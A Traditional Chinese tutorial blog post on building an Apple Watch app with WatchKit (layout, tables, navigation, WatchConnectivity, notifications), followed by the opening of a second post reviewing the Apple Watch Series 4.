App/UIKit基礎的讀者閱讀 本篇使用：iOS ≥ 9、watchOS ≥ 5為iOS專案新建 watchOS Target:File -&gt; New -&gt; Target -&gt; watchOS -&gt; WatchKit App*Apple Watch App無法獨立安裝，一定要依附在 iOS App 之下新建好之後目錄會長這樣：你會發現有兩個Target項目，缺一不可： WatchKit App: 負責存放資源、UI顯示/Interface.storyboard：同 iOS，裡面有系統預設建立的視圖控制器/Assets.xcassets：同 iOS，存放用到的資源項目/info.plist：同 iOS，WatchKit App 相關設定 WatchKit Extension: 負責程式呼叫、邏輯處理( * .swift)/InterfaceController.swift：預設的視圖控制器程式/ExtensionDelegate.swift：類似Swift的AppDelegate，Apple Watch App 啟動入口/NotificationController.swift：用於處理Apple Watch App上的推播顯示/Assets.xcassets：這裡不使用，我統一放在WatchKit App的Assets.xcassets下/info.plist：同 iOS，WatchKit Extension 相關設定/PushNotificationPayload.apns：推播資料，可用在模擬器上測試推播功能細節會在後面做介紹，先大概了解一下目錄及文件內容功能即可。視圖控制器：在AppleWatch中視圖控制器不叫ViewController而是InterfaceController ，你可以在WatchKit App/Interface.storyboard中找到Interface Controller Scence，控制它的程式就放在WatchKit Extension/InterfaceController.swift中(同iOS概念)Scene預設會和Notification Controller Scene擠在一起 (我會把它拉上面一點分開)可在右方設定InterfaceController的標題顯示文字．標題顏色部分吃的是Interface Builder Document/Global hint設定，整個App的風格顏色會是統一的．元件庫：沒有太多複雜的元件，元件功能也都簡單明瞭UI 排版：萬丈高樓從View起，排版的部分沒有 UIKit(iOS) 中的Auto Layout、約束、圖層，全都使用參數進行排版設置，更簡單有力(排起來有點像 UIKit 中的 UIStackView) 一切排版由Group組成，類似UIKit中的 UIStackView 但能設置更多排版參數Group的參數設置 Layout：設置被包在裡面的子View排版方式（水平、垂直、圖層堆疊） Insets：設置Group的上下左右間距 Spacing：設置被包在裡面的子View之間的間距 Radius：設置Group的圓角，沒錯！WatchKit自帶圓角設置參數 Alignment/Horizontal：設置水平對齊方式（左、中、右）與鄰居、外層包覆的View設置會有所連動 Alignment/Vertical：設置垂直對齊方式（上、中、下）與鄰居、外層包覆的View設置會有所連動 Size/Width：設置Group的大小，有三種模式可選「Fixed：指定寬度」、「Size To Fit Content：依照內容子View大小決定寬度」、「Relative to Container：參照外層包覆的View大小為寬度(可設%/+ -修正值)」 Size/Height：同Size/Width，此項是設置高度字型/字體大小設置：可直接套用系統的Text Styles，或使用Custom（但這邊我測試使用Custom無法設定字體大小）；所以 我是使用System 自訂各顯示Label的字體大小做中學：以Line排版為例排版部分不像 iOS 那麼複雜，所以我直接透過範例示範給大家看，就能直接上手；以 Line 的主頁排版為例子：在WatchKit App/Interface.storyboard中找到Interface Controller Scence:1.整個頁面，相當於 iOS App 開發中會使用到的 UITableView，在Apple Watch App 中簡化了操作，名字也改叫做「WKInterfaceTable」首先就先拉一個Table到Interface Controller Scence中同UIKit UITableView，有Table本體、有Cell(Apple Watch中叫做Row)；使用起來簡化許多， 你可以直接在此介面上進行Cell的設計排版！2. 分析排版架構，設計Row顯示樣式：要排出一個左邊有圓角滿版的Image且堆疊一個Label，右邊平均分配上下兩個區塊，上方放Label，下方也放Label的區塊2–1: 拉出左右兩區塊的架構拉兩個Group到Group中，並對Size參數分別設定：左邊綠色部分：Layout設定Overlap，裡面子View要做未讀訊息Label的圖層堆疊顯示設固定長寬40的正方形右邊紅色部分：Layout設定Vertical，裡面子View要做上下兩個顯示寬度設定參照外層，比例100%，扣掉左邊綠色部分40左右容器內排版：左邊部分：拉入一個Image，再拉入一個包覆Lable的Group對齊設右下(Group設底色再設間距及圓角)右邊部分：拉入兩個Label，一個對齊設左上，一個對齊設左下即可為Row命名(同UIKit UITableView為Cell設定identifier)：選定Row-&gt;Identifier-&gt;輸入自訂名稱Row的呈現樣式不只一種呢？非常簡單，只要在拉一個Row放在Table裡(實際要顯示哪個樣式的ROW由程式控制)並輸入Identifier命名即可這邊我再拉一個Row用於呈現無資料時的提示排版相關資訊watchKit的hidden不會佔位，可拿來做交互應用（有登入才顯示Table；沒登入顯示提示Label）排版到此告一段落，可依照個人設計做修改；上手容易，多排個幾次、玩玩對齊參數，就能熟悉！程式控制部分：接續Row，我們需要建立一個Class對Row進行參照操作：class ContactRow:NSObject {}class ContactRow:NSObject { var id:String? @IBOutlet var unReadGroup: WKInterfaceGroup! @IBOutlet var unReadLabel: WKInterfaceLabel! @IBOutlet weak var imageView: WKInterfaceImage! @IBOutlet weak var nameLabel: WKInterfaceLabel! @IBOutlet weak var timeLabel: WKInterfaceLabel!}拉outlet、儲存變數Table部分ㄧ樣拉Outlet到Controller中：class InterfaceController: WKInterfaceController { @IBOutlet weak var Table: WKInterfaceTable! override func awake(withContext context: Any?) { super.awake(withContext: context) // Configure interface objects here. } override func willActivate() { // This method is called when watch view controller is about to be visible to user super.willActivate() } struct ContactStruct { var name:String var image:String var time:String } func loadData() { //Get API Call Back... //postData { let data:[ContactStruct] = [] //api returned data... self.Table.setNumberOfRows(data.count, withRowType: \"ContactRow\") //如果你有多種ROW需要呈現則用： //self.Table.setRowTypes([\"ContactRow\",\"ContactRow2\",\"ContactRow3\"]) // for item in data.enumerated() { if let row = self.Table.rowController(at: item.offset) as? ContactRow { row.nameLabel.setText(item.element.name) //assign value to lable/image...... } } //} } override func didDeactivate() { // This method is called when watch view controller is no longer visible super.didDeactivate() loadData() } //處理Row點選時: override func table(_ table: WKInterfaceTable, didSelectRowAt rowIndex: Int) { guard let row = table.rowController(at: rowIndex) as? ContactRow,let id = row.id else { return } self.pushController(withName: \"showDetail\", context: id) }}Table的操作簡化許多沒有delegate/datasource，設定資料方式只要呼叫setNumberOfRows/setRowTypes指定Row數量和形態，再使用rowController(at:) 設定每列的資料內容即可！Table的Row選擇事件也只需 override func table( _ table: WKInterfaceTable, didSelectRowAt rowIndex: Int) 即可操作！(Table也只有這個事件)如何跳頁？首先為Interface Controller設定IdentifierwatchKit有兩種跳頁模式：1.類似iOS UIKit pushself.pushController(withName: Interface Controller Identifier , context: Any? )push方式可左上返回返回上一頁同iOS UIKit：self.pop( )返回根頁面：self.popToRootController( )開新頁面：self.presentController( )2. 頁籤顯示方式 WKInterfaceController.reloadRootControllers(withNames: [ Interface Controller Identifier ], contexts: [ Any? ] )亦或是在Storyboard上，在第一頁的Interface Controller上按Control+Click拖曳到第二頁選擇「next page」也可頁籤顯示方式可以左右切換頁面兩種跳頁方式不能混用．跳頁參數？不像iOS需要使用自訂delegate或segue方式傳遞參數，watchKit跳頁帶參數方式就是將參數放入上方方法中的 contexts 中即可．接收參數在 InterfaceController 的 awake(withContext context: Any?)例如我在A頁面要跳到B頁面並帶入id:Int時：A 頁面:self.pushController(withName: \"showDetail\", context: 100)B 頁面:override func awake(withContext context: Any?) { super.awake(withContext: context) guard let id = context as? Int else { print(\"參數錯誤！\") self.popToRootController() return } // Configure interface objects here.}程式控制元件部分相比iOS UIKit一樣簡化許多，有開發過iOS的應該上手很快！例如label變成setText( )p.s. 而且居然沒有getText的方法，只能extension變數或放在外部變數儲存與iPhone之間同步/資料傳遞如果有開發過iOS 相關 Extension 的話；下意識一定是用App Groups共享UserDefaults的方式，當初我也興沖沖的這樣做，然後卡了好久發現資料一直過不去，直到上網一查才發現，watchOS&gt;2之後就不再支援此方法了….要使用新的WatchConnectivity方式讓手機跟手錶之間進行通訊(類似socket概念)，iOS手機及手錶watchOS兩端都需要實做，我們寫成singleton模式如下：手機端：import WatchConnectivityclass WatchSessionManager: NSObject, WCSessionDelegate { @available(iOS 9.3, *) func session(_ session: WCSession, activationDidCompleteWith activationState: WCSessionActivationState, error: Error?) { //手機端session啟用完成 } func session(_ session: WCSession, didReceiveUserInfo userInfo: [String : Any] = [:]) { //手機端接受到手錶傳回的UserInfo } func session(_ session: WCSession, didReceiveMessage message: [String : Any], replyHandler: @escaping ([String : Any]) -&gt; Void) { //手機端接受到手錶回傳的Message } //另外還有didReceiveMessageData,didReceiveFile同樣都是處理收到手錶回傳的資料 //看你的資料傳遞接收需求決定要用哪個 func sendUserInfo() { guard let validSession = self.validSession,validSession.isReachable else { return } if userDefaultsTransfer?.isTransferring == true { userDefaultsTransfer?.cancel() } var list:[String:Any] = [:] //將UserDefaults放入list.... self.userDefaultsTransfer = validSession.transferUserInfo(list) } func sessionReachabilityDidChange(_ session: WCSession) { //與手錶APP連接狀態改變時(手錶開啟APP時/手錶關閉APP時) sendUserInfo() //我是當狀態改變，如為手錶開啟APP時就同步一次UserDefaults } func session(_ session: WCSession, didFinish userInfoTransfer: WCSessionUserInfoTransfer, error: Error?) { //完成同步UserDefaults(transferUserInfo) } func sessionDidBecomeInactive(_ session: WCSession) { } func sessionDidDeactivate(_ session: WCSession) { } static let sharedManager = WatchSessionManager() private override init() { super.init() } private let session: WCSession? = WCSession.isSupported() ? WCSession.default : nil private var validSession: WCSession? { if let session = session, session.isPaired &amp;&amp; session.isWatchAppInstalled { return session } //回傳有效且連接中且手錶APP開啟中的session return nil } func startSession() { session?.delegate = self session?.activate() }}WatchConnectivity 手機端的 Code並在iOS/AppDelegate.swift的application( _ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplicationLaunchOptionsKey: Any]?)中加入WatchSessionManager.sharedManager.startSession( )以在啟動手機APP後連接上session手錶端：import WatchConnectivityclass WatchSessionManager: NSObject, WCSessionDelegate { func session(_ session: WCSession, activationDidCompleteWith activationState: WCSessionActivationState, error: Error?) { } func sessionReachabilityDidChange(_ session: WCSession) { guard session.isReachable else { return } } func session(_ session: WCSession, didFinish userInfoTransfer: WCSessionUserInfoTransfer, error: Error?) { } func session(_ session: WCSession, didReceiveUserInfo userInfo: [String : Any] = [:]) { DispatchQueue.main.async { //UserDefaults: //print(userInfo) } } static let sharedManager = WatchSessionManager() private override init() { super.init() } private let session: WCSession? = WCSession.isSupported() ? WCSession.default : nil func startSession() { session?.delegate = self session?.activate() }}WatchConnectivity 手錶端的 Code並在WatchOS Extension/ExtensionDelegate.swift中的applicationDidFinishLaunching( ) 加入WatchSessionManager.sharedManager.startSession( )以在啟動手錶APP後連接上sessionWatchConnectivity 資料傳遞方式傳資料用：sendMessage,sendMessageData,transferUserInfo,transferFile收資料用：didReceiveMessageData,didReceive,didReceiveMessage兩端傳接收方法都ㄧ樣可以看到手錶傳資料到手機都通，但手機傳資料到手錶僅限手錶APP開啟中watchOS推播處理專案目錄底下的PushNotificationPayload.apns這時就派上用場了，這是用來在模擬器上測試推播之用，在模擬器上部署Watch App target，安裝完啟動App就會收到一則以這個檔案內容的推播，讓開發者更容易測試推播功能．如要修改/啟用/停用 PushNotificationPayload.apns，請選擇Target後Edit SchemewatchOS 推播處理：同iOS我們實做UNUserNotificationCenterDelegate，在watchOS中我們也實作一樣的方法，在watchOS Extension/ExtensionDelegate.swift中import WatchKitimport UserNotificationsimport WatchConnectivityclass ExtensionDelegate: NSObject, WKExtensionDelegate, UNUserNotificationCenterDelegate { func applicationDidFinishLaunching() { WatchSessionManager.sharedManager.startSession() //前面提到的WatchConnectivity連線 UNUserNotificationCenter.current().delegate = self //設定UNUserNotificationCenter delegate // Perform any final initialization of your application. } func userNotificationCenter(_ center: UNUserNotificationCenter, willPresent notification: UNNotification, withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -&gt; Void) { completionHandler([.sound, .alert]) //同iOS，此做法可讓推播在APP前景時依然會顯示 } func userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -&gt; Void) { //點擊推播時 guard let info = response.notification.request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt;,let data = info[\"data\"] as? Dictionary&lt;String,String&gt; else { completionHandler() return } //response.actionIdentifier可得點擊事件Identifier //預設點擊事件：UNNotificationDefaultActionIdentifier if alert[\"type\"] == \"new_ask\") { WKExtension.shared().rootInterfaceController?.pushController(withName: \"showDetail\", context: 100) //取得目前root interface controller 並 push } else { //其他處理.... //WKExtension.shared().rootInterfaceController?.presentController(withName: \"\", context: nil) } completionHandler() }}ExtensionDelegate.swiftwatchOS 推播顯示，分成三種： static： 預設推播顯示方式會同手機推播，這邊手機端iOS有實做UNUserNotificationCenter.setNotificationCategories在通知下方增加按鈕；Apple Watch預設亦然會出現 dynamic：動態處理推播顯示樣式（重組內容、顯示圖片） interactive：watchOS ≥ 5 後支援，在dynamic的基礎下再增加支援按鈕可在Interface.storyboard中的Static Notification Interface Controller Scene設定推播處理方式static沒什麼好說的，就是走預設的顯示方式，這邊先介紹dynamic，勾選「Has Dynamic Interface」後會出現「Dynamic Interface」可在此視圖設計你自訂的推播呈現方式（不能使用Button）：我的自訂推播呈現設計import WatchKitimport Foundationimport UserNotificationsclass NotificationController: WKUserNotificationInterfaceController { @IBOutlet var imageView: WKInterfaceImage! @IBOutlet var titleLabel: WKInterfaceLabel! @IBOutlet var contentLabel: WKInterfaceLabel! override init() { // Initialize variables here. super.init() self.setTitle(\"結婚吧\") //設定右上方標題 // Configure interface objects here. } override func willActivate() { // This method is called when watch view controller is about to be visible to user super.willActivate() } override func didDeactivate() { // This method is called when watch view controller is no longer visible super.didDeactivate() } override func didReceive(_ notification: UNNotification) { if #available(watchOSApplicationExtension 5.0, *) { self.notificationActions = [] //清除iOS實做的UNUserNotificationCenter.setNotificationCategories在通知下方增加的按鈕 } guard let info = notification.request.content.userInfo[\"aps\"] as? NSDictionary,let alert = info[\"alert\"] as? Dictionary&lt;String,String&gt; else { return } //推播資訊 self.titleLabel.setText(alert[\"title\"]) self.contentLabel.setText(alert[\"body\"]) if #available(watchOSApplicationExtension 5.0, *) { if alert[\"type\"] == \"new_msg\" { //如果是新訊息推播則在通知下方增加回覆按鈕 self.notificationActions = [UNNotificationAction(identifier: \"replyAction\",title: \"回覆\", options: [.foreground])] } else { //其他則增加查看按鈕 self.notificationActions = [UNNotificationAction(identifier: \"openAction\",title: \"查看\", options: [.foreground])] } } // This method is called when a notification needs to be presented. // Implement it if you use a dynamic notification interface. // Populate your dynamic notification interface as quickly as possible. }}程式部分，ㄧ樣拉outlet到controller並實做功能再來講到interactive，同dynamic，只是能多加Button，能跟dynamic設同個Class控制程式；interactive我沒有使用，因為我的按鈕是用程式self.notificationActions加上去的，差異如下：左使用interactive，右使用self.notificationActions兩個做法都需watchOS ≥ 5 支援．使用self.notificationActions增加按鈕則按鈕事件處理由ExtensionDelegate中的 userNotificationCenter(_ center: UNUserNotificationCenter, didReceive response: UNNotificationResponse, withCompletionHandler completionHandler: @escaping () -&gt; Void) 處理，並以identifier識別動作選單功能？在元件庫中拉入Menu，再拉入選單項目Menu Item，再拉IBAction到程式控制在頁面重壓就會出現：內容輸入？使用內建的presentTextInputController方法即可！@IBAction func replyBtnClick() { guard let target = target else { return } self.presentTextInputController(withSuggestions: [\"稍後回覆您\",\"謝謝\",\"歡迎與我聯絡\",\"好的\",\"OK!\"], allowedInputMode: WKTextInputMode.plain) { (results) in guard let results = results else { return } //有輸入值時 let txts = results.filter({ (txt) -&gt; Bool in if let txt = txt as? String,txt != \"\" { return true } else { return false } }).map({ (txt) -&gt; String in return txt as? String ?? \"\" }) //預處理輸入 txts.forEach({ (txt) in print(txt) }) }}總結 謝謝你看到這！辛苦了！到這裡文章已告一段落，大略提了一下UI排版、程式、推播、介面應用部分，有開發過iOS的上手真的很快，幾乎差不多而且許多方法都做了簡化使用起來更簡潔，但能做的事確實也變少了(像是目前還不知道怎麼針對Table做載入更多)；目前能做的事確實很少，希望官方在未來能開放更多API給開發者使用❤️❤️❤️MurMur:Apple Watch App Target 部署到手錶真的有夠慢 — Narcos有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 7,077 Total Views Last Statistics Date: 2025-08-15 | 6,942 Views on Medium." }, { "title": "Apple Watch Series 4 從入手到上手全方位心得", "url": "/posts/zrealm-life/apple-watch-series-4-%E5%BE%9E%E5%85%A5%E6%89%8B%E5%88%B0%E4%B8%8A%E6%89%8B%E5%85%A8%E6%96%B9%E4%BD%8D%E5%BF%83%E5%BE%97-a2920e33e73e/", "categories": "ZRealm Life.", "tags": "apple-watch, watchos, apple-watch-apps, 生活, 開箱", "date": "2018-11-26 22:18:41 +0800", "snippet": "Apple Watch Series 4 開箱 從入手到上手全方位心得 (2020–10–24更新)為什麼要買？好用嗎？哪裡好用？怎麼用？&amp; WatchOS APP推薦[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往從入手開始…個人背景首先自述一下個人使用蘋果產品的背景，我並非忠實果粉；第一次接觸是在 2015 年用打工薪水...", "content": "Apple Watch Series 4 開箱 從入手到上手全方位心得 (2020–10–24更新)為什麼要買？好用嗎？哪裡好用？怎麼用？&amp; WatchOS APP推薦[最新] Apple Watch Series 6 開箱＆使用兩年體驗心得 &gt;&gt;&gt;點我前往從入手開始…個人背景首先自述一下個人使用蘋果產品的背景，我並非忠實果粉；第一次接觸是在 2015 年用打工薪水買的 iPhone 6，後因工作所需直到去年才開始使用MacOS的電腦(Mac Mini)並在今年購入了自己的MacBook Pro、更換iPhone 8；其中我會踏入蘋果生態系的原因不外乎是： 工作需要（開發iOS APP一定要有MacOS設備） 工作效率（穩定度或程式切換、操作方式體驗都更好再配合生態系iPhone與MacOS之間的連動、資料同步在許多地方都能化繁為簡） 續航力、便攜性、Retina顯示器[2019–05–02更新]：蘋果全家桶的設備再添一項， AirPods 2 (開箱及上手體驗請點此)為何想買Apple Watch? 記錄運動情況、心率狀況 跑步不想帶手機 減少使用手機的時間，但又不想露接重要資訊 大包小包的時候能不用掏出手機/使用Apple Pay 靠近自動解鎖MacBook（我的MacBook Pro非Touch Bar版本，打密碼打得心很累） 騎車看導航 潮！沒用過，想買來玩玩 想寫 WatchOS APP開始挑選…綜合以上因素開始挑選適合的Apple Watch；撇除錶帶材質，單論本體有三種版本可供選擇： 鋁金屬錶殼+可能會刮傷的玻璃表面+GPS = $12,900(40mm) / $13,900 (44mm) 鋁金屬錶殼+可能會刮傷的玻璃表面+GPS+行動網路 = $16,500(40mm) / $17,500 (44mm) 不鏽鋼錶殼+藍寶石硬邦邦玻璃+GPS+行動網路 = $22,900(40mm) / $24,900 (44mm)我個人是買 2. 鋁金屬錶殼+可能會刮傷的玻璃表面+GPS+行動網路 44 mm錶面的部分：大小有40mm/44mm兩種，實際依照個人手腕大小做選擇，太大可能會不合手、心率偵測不準確；太小則戴起來看起來很怪左44mm/右40mm (感謝同事友情支援)如果一時找不到東西比較，可以拿一個日拋隱形眼鏡的匣子作比較約=44mm (實際測量44.5mm)這裡附上筆者的手給大家參考，若還是不確定大小最好還是跑一趟101門市去試戴看看（我當初也是先瞄準40mm，結果去實際帶過才發現太小…）*Apple Watch 3 38mm與 Apple Watch 4 40 mm 大小ㄧ樣錶帶通用 *Apple Watch 3 42mm與 Apple Watch 4 44 mm 大小ㄧ樣錶帶通用錶殼材質有鋁金屬錶殼+可能會刮傷的玻璃表面 和 不鏽鋼錶殼+藍寶石硬邦邦玻璃 兩種，預算充足的朋友當然建議選擇後者；個人因預算不足只好選擇前者；為何要選擇不鏽鋼錶殼+藍寶石硬邦邦玻璃版本呢？1.雖然本體較重（運動時可能會感覺到）但在生活上更容易與穿搭配合，皮革錶帶或金屬錶帶與不修綱機身搭配加上商務衣著能有更一致的品味觀感；休閒或運動時更換運動型錶帶也不失優雅，能動能靜！2.藍寶石硬邦邦玻璃不必費神擔心錶面刮傷（個人使用經驗：我的上一隻 iPhone 6 裸機使用一年多；沒特別傷害它，日常就放口袋、放桌上；螢幕還是刮得亂七八糟但鏡頭部分使用藍寶石硬邦邦玻璃所以完好如初）但我買的是一般版本…如果你上網搜尋Apple Watch貼膜的文章會找到兩派的人，一派支持認為會刮傷要貼膜；另一派反對認為是使用習慣問題、沒那麼脆弱會刮傷、你有看勞力士有貼膜？或你是佛系使用者買來就是要用、消耗性產品那也沒這困擾我個人有點強迫症有刮傷會不爽，所以支持要貼膜；使用習慣問題? 我覺得只有撞到才是使用習慣不良，日常粉塵傷害實在難防如果你也要貼膜，在這裡給你個建議「多花點錢找人貼」，一般我的手機都是自己貼的，為什麼說Apple Watch要找人貼？這部分搞得我心很累，首先我在Pchome買東京*用的玻璃鋼化保護貼來貼($399)，硬膜/只有邊框有膠，貼上去中間呈現一個中空狀態不密合觸控超級不靈敏(認真懷疑廠商是不是沒測試過？)，所以貼一下就撕掉了；第二次嘗試是買g*r軟膜($100/兩片)全膠能密合，但軟的很難貼容易有氣泡；兩片都試了還是有一點氣泡很礙眼，而且不疏油疏水用起來不順手。最後花了$990給人家貼好(x豪包膜) h*a果凍膠玻璃貼，密合、沒氣泡、滿版、疏油疏水如果還是想要自己嘗試貼膜的可以找找水凝膜。貼膜後的手感當然不比原生好（個人感覺大約 97分:100分）而且螢幕會高一小截 ，取捨就看個人囉！3.錶殼部分不鏽鋼較耐撞、刮傷可重新拋光，看同事的不鏽鋼版本完好如初沒任何刮傷；錶殼部分我比較不在意，真的在意的朋友或許可以包膜（？不鏽鋼版本 (感謝同事友情支援)所以預算充足的朋友還是建議升不銹鋼版本．關於選購保護殼：保護貼很容易碎邊，我在沒有保護殼(套)的狀態下，平均貼不到一個月就會不知道怎麼的受傷碎邊，一張$990…之前共換了三張，快吐血；目前用保護套之後已經過了4個月都還完好如初！ 建議「至少要用邊框保護套」哪一牌子都可 我的血淚教訓只想說一句相見恨晚，早知道有保護套這種產品就不用多花冤望錢！要不要買支援行動網路的版本？這部分我持保留態度；個人是有買行動網路版本，以後跑步運動就不用帶手機另外考量到要戴個2~3年不確定未來如何所以就先升級囉，但如果你預算有限，且不會沒帶手機出門，那可以只買WiFi版本就好（價差$3600）請考量以下幾點： 目前Spotify不支援離線播放，運動聽音樂還是要帶手機 (2018/11/21)p.s Apple Music/KKBOX 支援離線播放沒這問題 Apple Watch APP不多，能做的事也只有打電話/回訊息/回Line/回Fb Messenger/Apple Pay 僅此而已*Apple Pay不需行動網路版就能離線使用 行動網路使用需額外申辦並繳交每個月$199電信費(中華/~2018/12/31前申辦優惠價$149)，網路流量吃原本手機的方案 行動網路的運作方式是手錶將資料透過電信傳輸到手機再透過手機發送出去，因此你的 手機也必須處於開機狀態下才能使用手錶． *所以手機沒電關機…手錶也不能用，即使有辦行動網路[2020–10–24 更新] ：Spotify 已支援獨立播放，在手錶 Spotify APP 中選擇播放裝置-&gt;Apple Watch-&gt;連線藍牙耳機-&gt;即可播放！（依然還不支援離線下載播放，需再有網路環境下才可使用）。購買上週(2018/11/11)實際跑了一趟101沒有我要的貨，於是從網路下單由大陸發貨，11/11下單，11/12出貨，11/15準時送達：開箱拿到的時候很興奮直接拆開來用就沒做記錄了，開箱部分可參考網路： Apple Watch Series 4体验 全面屏手表，是你吗 ？ (大陸) 、 Apple Watch series 4完整開箱！其中三點功能超有 感 (台灣)補張開箱圖入手部分到此結束….開始上手配對、基礎設定這裡就不再贅述，可參考上面開箱文；這裡假定你已經都弄好開始使用Apple Watch了附一張按鈕圖 — Apple官方支援中心「Digital Crown」= 「數位錶冠」「Side Button」= 「側邊按鈕」按鈕操作部分： 點一下數位錶冠在主畫面與錶面之間切換 點兩下數位錶冠切換到最近開啟的APP 點一下側邊按鈕呼出Dock (多工視窗)，可設定顯示最近開啟的APP或自訂喜好的APP (打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;Dock-&gt;Dock排列) 點兩下側邊按鈕呼出Apple Pay，這時感應就會直接付款p.s Apple Pay預設卡片修改請打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;錢包與Apple Pay-&gt;交易預設值-&gt;預設卡片-&gt;選擇您要預設的卡片* 無法修改順序，只能指定某一張卡為預設放在第一 長壓側邊按鈕呼出系統選單「關閉電源」或「開機」、顯示醫療卡、播打SOS緊急電話Apple Watch 螢幕截圖功能很重要，所以放第一個，怎麼截Apple Watch的螢幕圖：打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt; 進入「一般」-&gt; 「啟用螢幕快照」打開在Apple Watch上同時按下數位錶冠和側邊按鈕，螢幕出現光影掠過效果後即表示截圖完成；這時打開iPhone就能看到截圖的相片囉！揚聲器手錶內建揚聲器只能通話時使用、播放提示音不能播放音樂；如果覺得用手錶講電話大家都會聽到可使用藍牙耳機各圖示狀態說明請參閱官方文件Apple Watch與iPhone之間的連線手錶在手機附近時使用藍牙，距離太遠時使用WiFi左邊表示連線中斷中，右邊表示連線正常中iPhone APP的通知傳送到Apple Watch手錶預設會吃iPhone上APP的通知設定，也可特別關閉某些APP的通知不要傳送到手錶（打開「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;「通知」-&gt;拉到最下方可針對各APP調整） 若APP沒在此列表出現則表示該APP本來就沒在iPhone上開啟通知功能（請去「iPhone」上的「設定」-&gt;「通知」-&gt;打開該APP通知功能） 為什麼有的通知會有提示音/震動有的不會？這項設定是吃iPhone上APP的通知設定，APP「通知」有開啟「聲音」就會有提示音及震動 大部分的APP通知都只支援查看，部分可支援操作（如Line的通知可點擊在手錶上回覆） 手機未使用狀態+手錶配戴中，手錶才會跳新通知提示/手機端不會響但依然會出現在通知中心；避免出現手機與手錶都同時響的情況APP有支援For Apple Watch時 預設在安裝APP時該APP有支援For Apple Watch的APP時也會一併在Apple Watch上安裝該APP（可從「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;「一般」-&gt;關閉「自動APP安裝」） 能不能只安裝Apple Watch APP？不行，目前無法獨立安裝Apple Watch APP；一定在iPhone都會有一個APP 不想安裝Apple Watch版的APP從「iPhone」上的「Watch」 APP -&gt;「我的手錶」頁-&gt;滾動到下方「已在APPLE WATCH上安裝」部分點進去-&gt;關閉「顯示App於Apple Watch」 APP寫支援「複雜功能」的意思就是支援錶盤小工具錶面設計隨便你玩隨便你放，你覺得哪些資訊重要或怎樣設計比較美都看個人；我是把「我隨時看手錶都會想知道的資訊」放在錶盤上，也可以加入多個錶面作切換。手電筒你沒看錯，Apple Watch也有手電筒；在錶面頁由底部上拉出選單找到「手電筒」符號的按鈕，進入後可以左右切化畫面顏色；沒錯，就是螢幕高亮顏色而已！比較特別的是還有一個爆閃模式：讓夜間活動更安全！各個模式「靜音模式」- 所有通知都靜音、都不震動、不亮螢幕提示，僅顯示在通知中心「劇院模式」- 抬手不會喚醒螢幕，要點擊螢幕才會喚醒「水中鎖定」- 螢幕觸控鎖定，要轉動數位錶冠後才能解鎖，解鎖後揚聲器會自動播放聲音排出積水「飛航模式」- 關閉所有外部連線「省電模式」- 真的很省電！只剩下按數位錶冠顯示時間功能，其他完全關閉，幾乎等於關機狀態；退出省電模式要按住側邊按鈕（同開機）以上所有模式，鬧鐘、倒數功能皆會照樣響「省電模式下會強制開機」抬手腕直接呼叫Siri只要抬起手腕，螢幕點亮後，可以直接說話使用Siri!，不用說「Hey! Siri」(EX： 抬手後直接說 “明天天氣” )。在手機離你有一段距離時也能使用Siri(EX：曬衣服的時候)。[2019–05–02更新]：更上一層的Siri體驗？請參考 AirPods 2 開箱及上手體驗心得 中的 Siri部分，AirPods 2 的 Siri 有戴耳機就能直接使用，連抬手腕都不用了。AQI空氣品質無法顯示?內建的AQI似乎不支援台灣地區，要去「App Store」搜尋「在意空氣」下載安裝+開啟後，再到錶盤設計複雜功能的地方改選擇「在意空氣」即可用Apple Watch解鎖Mac電腦 確認你的iPhone/Apple Watch/Mac電腦登入的是同個Apple帳號 確認你的Apple帳號有開啟 雙重認證 系統在檢測到你的Apple帳號有Apple Watch裝置之後就會在「系統偏好設置」-&gt;「安全與隱私權」-&gt;「一般」-&gt;新增一行「允許Apple Watch解鎖您的Mac」-&gt;「打勾即可」若一直啟用失敗，請先確認你的Apple帳號有開啟雙重認證(非 雙步認證 )或試試重啟電腦！p.s 我公司的Mac Mini就是一直無法啟用，重啟之後就正常了相片打開空白？預設顯示iPhone上喜愛的項目，打開iPhone的「相片」在想要傳到手錶上的相片點「愛心」就會出現了活動紀錄及體能訓練活動紀錄每日有三個圈圈三個目標：1. 站立(藍)：每一小時有站立1分鐘就算達成1次2. 運動(綠)：超越快走強度的活動時間才會被計算3.活動(紅)：燃燒的動態卡路里數，有在動就會增加詳細可查看iPhone上「健康」APP有詳細解說。每日達成紀錄會提示，另外可在Apple Watch上的「活動紀錄」APP重壓調整活動目標值（預設一天活動360大卡就達標了）體能訓練部分跑步我是使用Nike Run Club +沒使用內建的，上週去騎腳踏車試用內建的體能訓練-&gt;「室外單車」做紀錄，會記錄高度/距離/時間/路徑/心律 讚讚！地圖功能？目前僅支援Apple Map，Google Map暫時不支援，打開「地圖」搜尋或選擇個人資訊設定的公司住家地址（來源：聯絡資訊-&gt;我的名片）或聯絡資訊或自行輸入目標；開始導航後每個轉折點都是一張卡，依據行駛自動跳頁，可轉動查看，點擊可進入查看地圖內容，距離剩下40公尺的時候會震動提示你，重壓可結束導航．這部分只是把你手機的Apple Map資訊傳到手錶上（手錶導航時手機的導航也會自動打開）實際使用感想：Apple Map的地標很少難搜尋、好像只會導大路，明明有雙線道、更快、沒塞車的路線卻不導…所以還是期待Google Map更新吧，這個就先加減用了這裡附上一個Siri捷徑： 使用Apple Map開啟Google Map項目藍芽拍照按鈕Apple Watch 打開 「相機」這時手機的相機也會打開，就能用手錶控制手機的相機進行拍照、錄影，重壓進行切換鏡頭/設定相機．我的手機在哪裡啊？在錶面頁由底部上拉出選單找到一個「手機在震動的Icon」點擊後手機就會發出聲響！ 手機在靜音、無擾狀態下依然會發出聲響 